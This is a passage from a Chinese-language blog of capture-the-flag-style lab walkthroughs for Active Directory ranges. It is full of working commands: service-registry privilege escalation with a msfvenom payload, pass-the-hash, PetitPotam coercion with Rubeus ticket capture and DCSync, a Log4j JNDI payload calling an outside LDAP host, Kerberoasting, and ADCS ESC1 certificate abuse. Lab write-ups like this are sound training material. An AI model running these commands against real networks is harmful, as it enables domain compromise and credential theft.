class=\"line\">    return self._transport.connect()</span><br><span class=\"line\">           ^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class=\"line\">  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;impacket&#x2F;dcerpc&#x2F;v5&#x2F;transport.py&quot;, line 514, in connect</span><br><span class=\"line\">    self.__smb_connection.login(self._username, self._password, self._domain, self._lmhash, self._nthash)</span><br><span class=\"line\">  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;impacket&#x2F;smbconnection.py&quot;, line 282, in login</span><br><span class=\"line\">    raise SessionError(e.get_error_code(), e.get_error_packet())</span><br><span class=\"line\">impacket.smbconnection.SessionError: SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - &#123;Access Denied&#125; A process has requested access to an object but has not been granted those access rights.</span><br></pre></td></tr></table></figure>\n\n<p>使用rdp修改密码为 <code>Admin@123</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">rdesktop 172.22.4.45 -d WIN19 -u Adrian -p babygirl1 -z</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"注册表提权\"><a href=\"#注册表提权\" class=\"headerlink\" title=\"注册表提权\"></a>注册表提权</h1><p>利用提权检查脚本发现存在对 SYSTEM用户的 gupdate 服务的注册表路径有修改权限</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">powershell -ep bypass -c &quot;. .\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250501185044977.png\" alt=\"image-20250501185044977\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Name              : gupdate</span><br><span class=\"line\">ImagePath         : &quot;C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe&quot; &#x2F;svc</span><br><span class=\"line\">User              : LocalSystem</span><br><span class=\"line\">ModifiablePath    : HKLM\\SYSTEM\\CurrentControlSet\\Services\\gupdate</span><br><span class=\"line\">IdentityReference : NT AUTHORITY\\Authenticated Users</span><br><span class=\"line\">Permissions       : WriteDAC, Notify, ReadControl, CreateLink, EnumerateSubKeys, WriteOwner, Delete, CreateSubKey, SetV</span><br><span class=\"line\">                    alue, QueryValue</span><br><span class=\"line\">Status            : Stopped</span><br><span class=\"line\">UserCanStart      : True</span><br><span class=\"line\">UserCanStop       : True</span><br><span class=\"line\"></span><br><span class=\"line\">Name              : gupdate</span><br><span class=\"line\">ImagePath         : &quot;C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe&quot; &#x2F;svc</span><br><span class=\"line\">User              : LocalSystem</span><br><span class=\"line\">ModifiablePath    : HKLM\\SYSTEM\\CurrentControlSet\\Services\\gupdate</span><br><span class=\"line\">IdentityReference : BUILTIN\\Users</span><br><span class=\"line\">Permissions       : WriteDAC, Notify, ReadControl, CreateLink, EnumerateSubKeys, WriteOwner, Delete, CreateSubKey, SetV</span><br><span class=\"line\">                    alue, QueryValue</span><br><span class=\"line\">Status            : Stopped</span><br><span class=\"line\">UserCanStart      : True</span><br><span class=\"line\">UserCanStop       : True</span><br><span class=\"line\"></span><br><span class=\"line\">Name              : Spooler</span><br><span class=\"line\">ImagePath         : C:\\Windows\\System32\\spoolsv.exe</span><br><span class=\"line\">User              : LocalSystem</span><br><span class=\"line\">ModifiablePath    : HKLM\\SYSTEM\\CurrentControlSet\\Services\\Spooler</span><br><span class=\"line\">IdentityReference : NT AUTHORITY\\Authenticated Users</span><br><span class=\"line\">Permissions       : ReadControl, EnumerateSubKeys, WriteOwner, CreateSubKey, QueryValue</span><br><span class=\"line\">Status            : Running</span><br><span class=\"line\">UserCanStart      : False</span><br><span class=\"line\">UserCanStop       : False</span><br></pre></td></tr></table></figure>\n\n<p>msf生成exe，去执行a.bat</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows&#x2F;x64&#x2F;exec cmd&#x3D;&#39;C:\\windows\\system32\\cmd.exe &#x2F;c C:\\Users\\Public\\Downloads\\a.bat &#39; --platform windows -f exe-service &gt; a.exe</span><br></pre></td></tr></table></figure>\n\n<p>a.bat</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">net localgroup administrators Adrian &#x2F;add</span><br></pre></td></tr></table></figure>\n\n<p>修改服务程序路径</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 修改服务程序</span><br><span class=\"line\">reg add &quot;HKLM\\SYSTEM\\CurrentControlSet\\Services\\gupdate&quot; &#x2F;t REG_EXPAND_SZ &#x2F;v ImagePath &#x2F;d &quot;C:\\Users\\Public\\Downloads\\a.exe&quot; &#x2F;f</span><br><span class=\"line\"># 查询</span><br><span class=\"line\">reg query &quot;HKLM\\SYSTEM\\CurrentControlSet\\Services\\gupdate&quot; &#x2F;v ImagePath</span><br><span class=\"line\"># 启动</span><br><span class=\"line\">sc start gupdate</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250501192154286.png\" alt=\"image-20250501192154286\"></p>\n<p>flag02</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250501192609130.png\" alt=\"image-20250501192609130\"></p>\n<h1 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h1><p>提权后reg拿到机器密码hash，pth去做域内信息收集</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">WIN19$：aad3b435b51404eeaad3b435b51404ee:c38ca39606871db61c1389b0fbedf381</span><br></pre></td></tr></table></figure>\n\n<p>用机器hash做PTH</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth &#x2F;user:WIN19$ &#x2F;domain:xiaorang.lab &#x2F;ntlm:c38ca39606871db61c1389b0fbedf381&quot; exit</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250501195922825.png\" alt=\"image-20250501195922825\"></p>\n<p><strong>委派信息查询</strong></p>\n<p>在Win19本地使用adfind，直接查到当前机器配置了非约束委派</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Users\\Public\\Downloads&gt;AdFind.exe -b &quot;DC&#x3D;xiaorang,DC&#x3D;lab&quot; -f &quot;(&amp;(samAccountType&#x3D;805306369)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; -dn</span><br><span class=\"line\"></span><br><span class=\"line\">AdFind V01.62.00cpp Joe Richards (support@joeware.net) October 2023</span><br><span class=\"line\"></span><br><span class=\"line\">Using server: DC01.xiaorang.lab:389</span><br><span class=\"line\">Directory: Windows Server 2016</span><br><span class=\"line\"></span><br><span class=\"line\">dn:CN&#x3D;DC01,OU&#x3D;Domain Controllers,DC&#x3D;xiaorang,DC&#x3D;lab</span><br><span class=\"line\">dn:CN&#x3D;WIN19,CN&#x3D;Computers,DC&#x3D;xiaorang,DC&#x3D;lab</span><br><span class=\"line\"></span><br><span class=\"line\">2 Objects returned</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250501200244951.png\" alt=\"image-20250501200244951\"></p>\n<p>远程可以用impacket</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-findDelegation xiaorang.lab&#x2F;&#39;WIN19$&#39; -hashes :c38ca39606871db61c1389b0fbedf381 -dc-ip 172.22.4.7 </span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250501200515429.png\" alt=\"image-20250501200515429\"></p>\n<p>远程还可以用adinfo</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Adinfo_win.exe -d xiaorang.lab --dc 172.22.4.7 -u WIN19$ -H c38ca39606871db61c1389b0fbedf381 --checkbackdoor</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250501201351595.png\" alt=\"image-20250501201351595\"></p>\n<blockquote>\n<p>在win上能正常走代理，在linux下貌似有bug，拒绝访问</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250501201504490.png\" alt=\"image-20250501201504490\"></p>\n<p>所以下面只需要强制触发域控认证即可！</p>\n<h1 id=\"非约束委派-NTLM-强制认证\"><a href=\"#非约束委派-NTLM-强制认证\" class=\"headerlink\" title=\"非约束委派+NTLM 强制认证\"></a>非约束委派+NTLM 强制认证</h1><p>使用 Printerbug、PetitPotam 、dfscoerce等强制域控进行认证</p>\n<blockquote>\n<p>PetitPotam 在2008、2012低版本环境下可匿名触发：匿名访问的命名管道中有三个netlogon、samr、lsarpc</p>\n<p>impacket-PetitPotam WIN7.test.com 192.168.100.128</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 -q impacket-PetitPotam -u &#39;WIN19$&#39; -hashes :c38ca39.. -d xiaorang.lab -dc-ip 172.22.4.7 WIN19.xiaorang.lab 172.22.4.7</span><br><span class=\"line\"></span><br><span class=\"line\">proxychains4 -q impacket-dfscoerce -u &#39;WIN19$&#39; -hashes :c38ca39.. -d xiaorang.lab -dc-ip 172.22.4.7 WIN19.xiaorang.lab 172.22.4.7</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250501202614834.png\" alt=\"image-20250501202614834\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250501202929756.png\" alt=\"image-20250501202929756\"></p>\n<p>Rubeus开启监听并获取域控机器用户的TGT票据</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Rubeus-net47.exe monitor &#x2F;interval:3 &#x2F;targetuser:DC01$ &#x2F;nowrap</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250501204022976.png\" alt=\"image-20250501204022976\"></p>\n<h1 id=\"攻击域控\"><a href=\"#攻击域控\" class=\"headerlink\" title=\"攻击域控\"></a>攻击域控</h1><p>kali导入票据进行dcsync</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 转换票据</span><br><span class=\"line\">echo &#39;doIFlDCCBZCg..&#39; | base64 -d &gt; DC.kirbi</span><br><span class=\"line\">impacket-ticketConverter DC.kirbi DC.ccache</span><br><span class=\"line\"></span><br><span class=\"line\"># 导入票据</span><br><span class=\"line\">export KRB5CCNAME&#x3D;DC.ccache</span><br><span class=\"line\"></span><br><span class=\"line\"># 查看票据</span><br><span class=\"line\">klist</span><br><span class=\"line\"></span><br><span class=\"line\"># secretsdump</span><br><span class=\"line\">正确：impacket-secretsdump -k -no-pass &#39;DC-1$&#39;@DC-1.test.com -dc-ip 192.168.100.128</span><br><span class=\"line\">错误：impacket-secretsdump xiaorang.lab&#x2F;Administrator@172.22.4.7 -just-dc-ntlm -k -no-pass</span><br></pre></td></tr></table></figure>\n\n<p>可以看到导入的票据为krbtgt的TGT票据</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250508015256007.png\" alt=\"image-20250508015256007\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250508015315649.png\" alt=\"image-20250508015315649\"></p>\n<p>也可以用 Rubeus + mimikatz</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Rubeus.exe ptt &#x2F;ticket:doIFlDC...</span><br><span class=\"line\">klist</span><br><span class=\"line\">mimikatz.exe &quot;lsadump::dcsync &#x2F;domain:xiaorang.lab &#x2F;all &#x2F;csv&quot; exit</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250501220838432.png\" alt=\"image-20250501220838432\"></p>\n<p>PTH打域控和另一台</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 -q impacket-wmiexec xiaorang.lab&#x2F;Administrator@172.22.4.19 -hashes :4889f6553239ace1f7c47fa2c619c252 -codec GBK -shell-type powershell</span><br><span class=\"line\"></span><br><span class=\"line\">proxychains4 -q impacket-wmiexec xiaorang.lab&#x2F;Administrator@172.22.4.7 -hashes :4889f6553239ace1f7c47fa2c619c252 -codec GBK -shell-type powershell</span><br></pre></td></tr></table></figure>\n\n\n\n","categories":["云境靶场"]},{"title":"春秋云境-Certify","url":"/2025/03/02/Certify/","content":"<!--more-->\n\n<img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/629d96b5b1bed8ff6561eccc7b058290.png\" style=\"zoom: 67%;\" />\n\n\n<h1 id=\"学习点\"><a href=\"#学习点\" class=\"headerlink\" title=\"学习点\"></a>学习点</h1><p>一、ADCS 攻击面：</p>\n<p><a href=\"https://xz.aliyun.com/news/11073\">https://xz.aliyun.com/news/11073</a></p>\n<p><a href=\"https://xz.aliyun.com/news/11713\">https://xz.aliyun.com/news/11713</a></p>\n<p><a href=\"https://xz.aliyun.com/news/13175\">https://xz.aliyun.com/news/13175</a></p>\n<p><a href=\"https://xz.aliyun.com/news/13868\">https://xz.aliyun.com/news/13868</a></p>\n<p><a href=\"https://forum.butian.net/share/1941\">https://forum.butian.net/share/1941</a></p>\n<table>\n<thead>\n<tr>\n<th>内网地址</th>\n<th>Host or FQDN</th>\n<th>简要描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>172.22.9.19</td>\n<td>ubuntu</td>\n<td>外网 Solr 服务器</td>\n</tr>\n<tr>\n<td>172.22.9.47</td>\n<td>FILESERVER</td>\n<td>fileserver 服务器</td>\n</tr>\n<tr>\n<td>172.22.9.26</td>\n<td>DESKTOP-CBKTVMO.xiaorang.lab</td>\n<td>域内 PC 机</td>\n</tr>\n<tr>\n<td>172.22.9.7</td>\n<td>XIAORANG-DC.xiaorang.lab</td>\n<td>域控</td>\n</tr>\n</tbody></table>\n<hr>\n<h1 id=\"log4j2\"><a href=\"#log4j2\" class=\"headerlink\" title=\"log4j2\"></a>log4j2</h1><p>solr - log4j2 - sudo -l 提权</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;solr&#x2F;admin&#x2F;cores?action&#x3D;$&#123;jndi:ldap:&#x2F;&#x2F;xx.xx.xx.xx&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">sudo grc --pty &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250302151301873.png\" alt=\"image-20250302151301873\"></p>\n<p>fscan</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[*]172.22.9.26</span><br><span class=\"line\">   [-&gt;]DESKTOP-CBKTVMO</span><br><span class=\"line\">   [-&gt;]172.22.9.26</span><br><span class=\"line\"></span><br><span class=\"line\">[*]172.22.9.7</span><br><span class=\"line\">   [-&gt;]XIAORANG-DC</span><br><span class=\"line\">   [-&gt;]172.22.9.7</span><br><span class=\"line\"></span><br><span class=\"line\">[*] WebTitle http:&#x2F;&#x2F;172.22.9.47        code:200 len:10918  title:Apache2 Ubuntu Default Page: It works</span><br><span class=\"line\">[*] NetBios 172.22.9.7      [+] DC:XIAORANG\\XIAORANG-DC    </span><br><span class=\"line\">[*] NetBios 172.22.9.26     DESKTOP-CBKTVMO.xiaorang.lab        Windows Server 2016 Datacenter 14393</span><br><span class=\"line\">[*] NetBios 172.22.9.47     fileserver                          Windows 6.1</span><br><span class=\"line\">[*] WebTitle http:&#x2F;&#x2F;172.22.9.7         code:200 len:703    title:IIS Windows Server</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"SMB\"><a href=\"#SMB\" class=\"headerlink\" title=\"SMB\"></a>SMB</h1><p>fscan扫出来SMB</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[+] SMB 172.22.9.47:445:administrator 123456</span><br></pre></td></tr></table></figure>\n\n<p>smbclient登录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 -q impacket-smbclient administrator:123456@172.22.9.47</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250302152626501.png\" alt=\"image-20250302152626501\"></p>\n<p>在db文件中发现域用户信息和几个密码</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250302154114519.png\" alt=\"image-20250302154114519\"></p>\n<p>组字典，跑</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 -q crackmapexec smb -u user.txt -p pass.txt -d xiaorang.lab --continue-on-success 172.22.9.0&#x2F;24</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">SMB         172.22.9.47     445    FILESERVER       [+] xiaorang.lab\\huangmin:admin</span><br><span class=\"line\">SMB         172.22.9.26     445    DESKTOP-CBKTVMO  [+] xiaorang.lab\\zhangjian:i9XDE02pLVf</span><br><span class=\"line\">SMB         172.22.9.7      445    XIAORANG-DC      [+] xiaorang.lab\\zhangjian:i9XDE02pLVf</span><br><span class=\"line\">SMB         172.22.9.47     445    FILESERVER       [+] xiaorang.lab\\liupeng:fiAzGwEMgTY </span><br><span class=\"line\">SMB         172.22.9.26     445    DESKTOP-CBKTVMO  [+] xiaorang.lab\\liupeng:fiAzGwEMgTY </span><br><span class=\"line\">SMB         172.22.9.7      445    XIAORANG-DC      [+] xiaorang.lab\\liupeng:fiAzGwEMgTY</span><br><span class=\"line\"></span><br><span class=\"line\">验证两个有效域账户：</span><br><span class=\"line\">xiaorang.lab\\zhangjian:i9XDE02pLVf</span><br><span class=\"line\">xiaorang.lab\\liupeng:fiAzGwEMgTY </span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Kerberoasting\"><a href=\"#Kerberoasting\" class=\"headerlink\" title=\"Kerberoasting\"></a>Kerberoasting</h1><p>尝试ASREP-Roasting，没有结果</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 -q impacket-GetNPUsers xiaorang.lab&#x2F; -dc-ip 172.22.9.7 -usersfile user.txt -format hashcat -outputfile hashes.txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250302155901568.png\" alt=\"image-20250302155901568\"></p>\n<p>尝试Kerberoasting</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-GetUserSPNs xiaorang.lab&#x2F;zhangjian:i9XDE02pLVf -dc-ip 172.22.9.7 -request -outputfile kerberoast.txt</span><br></pre></td></tr></table></figure>\n\n<p>出来三个结果</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">TERMSERV&#x2F;desktop-cbktvmo.xiaorang.lab  zhangxia            2023-07-14 00:45:45.213944  &lt;never&gt;               </span><br><span class=\"line\">WWW&#x2F;desktop-cbktvmo.xiaorang.lab&#x2F;IIS   zhangxia            2023-07-14 00:45:45.213944  &lt;never&gt;               </span><br><span class=\"line\">TERMSERV&#x2F;win2016.xiaorang.lab          chenchen            2023-07-14 00:45:39.767035  &lt;never&gt; </span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250302161049502.png\" alt=\"image-20250302161049502\"></p>\n<p>本地爆破</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">hashcat -m 13100 -a 0 kerberoast.txt &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt --force</span><br></pre></td></tr></table></figure>\n\n<p>又得到两个域用户</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">xiaorang.lab\\chenchen\t@Passw0rd@</span><br><span class=\"line\">xiaorang.lab\\zhangxia\tMyPass2@@6</span><br></pre></td></tr></table></figure>\n\n<p>根据SPN服务去尝试RDP，只有DESKTOP-CBKTVMO可以上去，然后发现该域用户没有权限读取本地管理员的flag，只能尝试打域管账号再拿flag</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250302165653834.png\" alt=\"image-20250302165653834\"></p>\n<h1 id=\"ADCS-ESC1\"><a href=\"#ADCS-ESC1\" class=\"headerlink\" title=\"ADCS-ESC1\"></a>ADCS-ESC1</h1><p>尝试使用 <a href=\"https://github.com/GhostPack/Certify\">Certify</a> 查找 AD CS 模板相关的漏洞</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Users\\zhangxia\\Desktop&gt;Certify.exe find &#x2F;vulnerable</span><br><span class=\"line\"></span><br><span class=\"line\">   _____          _   _  __</span><br><span class=\"line\">  &#x2F; ____|        | | (_)&#x2F; _|</span><br><span class=\"line\"> | |     ___ _ __| |_ _| |_ _   _</span><br><span class=\"line\"> | |    &#x2F; _ \\ &#39;__| __| |  _| | | |</span><br><span class=\"line\"> | |___|  __&#x2F; |  | |_| | | | |_| |</span><br><span class=\"line\">  \\_____\\___|_|   \\__|_|_|  \\__, |</span><br><span class=\"line\">                             __&#x2F; |</span><br><span class=\"line\">                            |___.&#x2F;</span><br><span class=\"line\">  v1.1.0</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Action: Find certificate templates</span><br><span class=\"line\">[*] Using the search base &#39;CN&#x3D;Configuration,DC&#x3D;xiaorang,DC&#x3D;lab&#39;</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Listing info about the Enterprise CA &#39;xiaorang-XIAORANG-DC-CA&#39;</span><br><span class=\"line\"></span><br><span class=\"line\">    Enterprise CA Name            : xiaorang-XIAORANG-DC-CA</span><br><span class=\"line\">    DNS Hostname                  : XIAORANG-DC.xiaorang.lab</span><br><span class=\"line\">    FullName                      : XIAORANG-DC.xiaorang.lab\\xiaorang-XIAORANG-DC-CA</span><br><span class=\"line\">    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED</span><br><span class=\"line\">    Cert SubjectName              : CN&#x3D;xiaorang-XIAORANG-DC-CA, DC&#x3D;xiaorang, DC&#x3D;lab</span><br><span class=\"line\">    Cert Thumbprint               : 37BFD9FE73CA81E18E7A87CEBD90AF267E57170E</span><br><span class=\"line\">    Cert Serial                   : 43A73F4A37050EAA4E29C0D95BC84BB5</span><br><span class=\"line\">    Cert Start Date               : 2023&#x2F;7&#x2F;14 12:33:21</span><br><span class=\"line\">    Cert End Date                 : 2028&#x2F;7&#x2F;14 12:43:21</span><br><span class=\"line\">    Cert Chain                    : CN&#x3D;xiaorang-XIAORANG-DC-CA,DC&#x3D;xiaorang,DC&#x3D;lab</span><br><span class=\"line\">    UserSpecifiedSAN              : Disabled</span><br><span class=\"line\">    CA Permissions                :</span><br><span class=\"line\">      Owner: BUILTIN\\Administrators        S-1-5-32-544</span><br><span class=\"line\"></span><br><span class=\"line\">      Access Rights                                     Principal</span><br><span class=\"line\"></span><br><span class=\"line\">      Allow  Enroll                                     NT AUTHORITY\\Authenticated UsersS-1-5-11</span><br><span class=\"line\">      Allow  ManageCA, ManageCertificates               BUILTIN\\Administrators        S-1-5-32-544</span><br><span class=\"line\">      Allow  ManageCA, ManageCertificates               XIAORANG\\Domain Admins        S-1-5-21-990187620-235975882-534697781-512</span><br><span class=\"line\">      Allow  ManageCA, ManageCertificates               XIAORANG\\Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519</span><br><span class=\"line\">    Enrollment Agent Restrictions : None</span><br><span class=\"line\"></span><br><span class=\"line\">[!] Vulnerable Certificates Templates :</span><br><span class=\"line\"></span><br><span class=\"line\">    CA Name                               : XIAORANG-DC.xiaorang.lab\\xiaorang-XIAORANG-DC-CA</span><br><span class=\"line\">    Template Name                         : XR Manager</span><br><span class=\"line\">    Schema Version                        : 2</span><br><span class=\"line\">    Validity Period                       : 1 year</span><br><span class=\"line\">    Renewal Period                        : 6 weeks</span><br><span class=\"line\">    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT</span><br><span class=\"line\">    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS</span><br><span class=\"line\">    Authorized Signatures Required        : 0</span><br><span class=\"line\">    pkiextendedkeyusage                   : 安全电子邮件, 加密文件系统, 客户端身份验证</span><br><span class=\"line\">    mspki-certificate-application-policy  : 安全电子邮件, 加密文件系统, 客户端身份验证</span><br><span class=\"line\">    Permissions</span><br><span class=\"line\">      Enrollment Permissions</span><br><span class=\"line\">        Enrollment Rights           : NT AUTHORITY\\Authenticated UsersS-1-5-11</span><br><span class=\"line\">                                      XIAORANG\\Domain Admins        S-1-5-21-990187620-235975882-534697781-512</span><br><span class=\"line\">                                      XIAORANG\\Domain Users         S-1-5-21-990187620-235975882-534697781-513</span><br><span class=\"line\">                                      XIAORANG\\Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519</span><br><span class=\"line\">      Object Control Permissions</span><br><span class=\"line\">        Owner                       : XIAORANG\\Administrator        S-1-5-21-990187620-235975882-534697781-500</span><br><span class=\"line\">        WriteOwner Principals       : XIAORANG\\Administrator        S-1-5-21-990187620-235975882-534697781-500</span><br><span class=\"line\">                                      XIAORANG\\Domain Admins        S-1-5-21-990187620-235975882-534697781-512</span><br><span class=\"line\">                                      XIAORANG\\Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519</span><br><span class=\"line\">        WriteDacl Principals        : XIAORANG\\Administrator        S-1-5-21-990187620-235975882-534697781-500</span><br><span class=\"line\">                                      XIAORANG\\Domain Admins        S-1-5-21-990187620-235975882-534697781-512</span><br><span class=\"line\">                                      XIAORANG\\Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519</span><br><span class=\"line\">        WriteProperty Principals    : XIAORANG\\Administrator        S-1-5-21-990187620-235975882-534697781-500</span><br><span class=\"line\">                                      XIAORANG\\Domain Admins        S-1-5-21-990187620-235975882-534697781-512</span><br><span class=\"line\">                                      XIAORANG\\Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519</span><br><span class=\"line\">Certify completed in 00:00:09.6367361</span><br><span class=\"line\"></span><br><span class=\"line\"># 后续利用</span><br><span class=\"line\">Certify.exe request &#x2F;ca:CA01.xiaorang.lab\\xiaorang-CA01-CA &#x2F;template:&quot;XR Manager&quot; &#x2F;altname:XIAORANG.LAB\\Administrator</span><br><span class=\"line\">openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx</span><br><span class=\"line\">Rubeus.exe asktgt &#x2F;user:Administrator &#x2F;certificate:cert.pfx &#x2F;password:abc@123 &#x2F;ptt</span><br></pre></td></tr></table></figure>\n\n<p>或者使用<a href=\"https://github.com/ly4k/Certipy\">Certipy</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 -q certipy-ad find -u &#39;zhangxia@xiaorang.lab&#39; -p &#39;MyPass2@@6&#39; -dc-ip 172.22.9.7 -vulnerable -stdout </span><br><span class=\"line\">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Finding certificate templates</span><br><span class=\"line\">[*] Found 35 certificate templates</span><br><span class=\"line\">[*] Finding certificate authorities</span><br><span class=\"line\">[*] Found 1 certificate authority</span><br><span class=\"line\">[*] Found 13 enabled certificate templates</span><br><span class=\"line\">[*] Trying to get CA configuration for 